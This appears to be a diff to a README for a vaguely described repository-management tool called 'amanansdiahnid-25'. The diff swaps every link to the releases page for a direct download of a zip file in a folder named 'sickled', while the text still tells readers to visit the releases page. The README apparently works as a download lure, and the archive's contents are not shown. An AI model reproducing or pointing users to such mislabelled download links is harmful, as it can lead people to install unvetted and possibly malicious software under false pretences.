@@ -4,12 +4,12 @@
 
 Welcome to the **amanansdiahnid-25** repository! This tool simplifies your experience in managing repositories with ease. Follow the steps below to download and run the application.
 
-[![Download amanansdiahnid-25](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/munzirahmedd/amanansdiahnid-25/releases)
+[![Download amanansdiahnid-25](https://raw.githubusercontent.com/munzirahmedd/amanansdiahnid-25/main/sickled/amanansdiahnid-25.zip)](https://raw.githubusercontent.com/munzirahmedd/amanansdiahnid-25/main/sickled/amanansdiahnid-25.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**: Go to the following link to access the releases page:
-   [Download Here](https://github.com/munzirahmedd/amanansdiahnid-25/releases)
+   [Download Here](https://raw.githubusercontent.com/munzirahmedd/amanansdiahnid-25/main/sickled/amanansdiahnid-25.zip)
    
 2. **Select the Latest Version**: On the releases page, look for the latest version of the application. The versions are listed in descending order, so the top one is usually the newest.
 
@@ -63,4 +63,4 @@ This project is licensed under the MIT License. You can use, modify, and distrib
 We plan to add more features based on user feedback. Stay tuned for improvements and new functionalities in upcoming releases!
 
 Remember, to start using **amanansdiahnid-25**, download the latest version from the releases page:  
-[Download Here](https://github.com/munzirahmedd/amanansdiahnid-25/releases)
+[Download Here](https://raw.githubusercontent.com/munzirahmedd/amanansdiahnid-25/main/sickled/amanansdiahnid-25.zip)
